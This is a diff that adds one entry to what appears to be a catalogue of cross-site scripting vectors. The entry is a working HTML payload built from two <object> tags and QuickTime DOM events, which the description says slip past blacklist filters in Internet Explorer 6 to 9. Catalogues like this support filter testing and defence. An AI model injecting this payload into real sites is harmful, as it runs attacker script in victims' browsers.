@@ -4329,5 +4329,37 @@ var items =
         },
         'tags'      : [ 'svg', 'html', 'chameleon', 'xslt', 'embedded', 'xss'],
         'reporter'  : '.mario'
-    }
+    },
+    { /* ID 126 - QuickTime events causing JavaScript execution */
+        'id'        : 126,
+        'category'  : 'html',
+        'name'      : {
+            'en'    : 'QuickTime events causing JavaScript execution',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'data'      : '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\r\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="%js_alert%" " style="behavior:url(#x);"><param name=postdomevents /></object>',
+        'description' : {
+            'en'    : 'The above displayed construct enables usage of the more or less unknown QuickTime DOM events. Those contain anj underscore - which is rather uncommon for event handlers and thus bypasses many blacklist based filters. The attack only works if both <object> tags are in place - and <object> tag 1 supplys the necessary behavior for object tag two.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'urls'      : ['http://developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/QTScripting_JavaScript/bQTScripting_JavaScri_Document/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6'],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'browsers'  : {
+			'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'      : [ 'quicktime', 'html', 'event', 'object', 'classid', 'xss'],
+        'reporter'  : '.mario'
+    }	
 ]
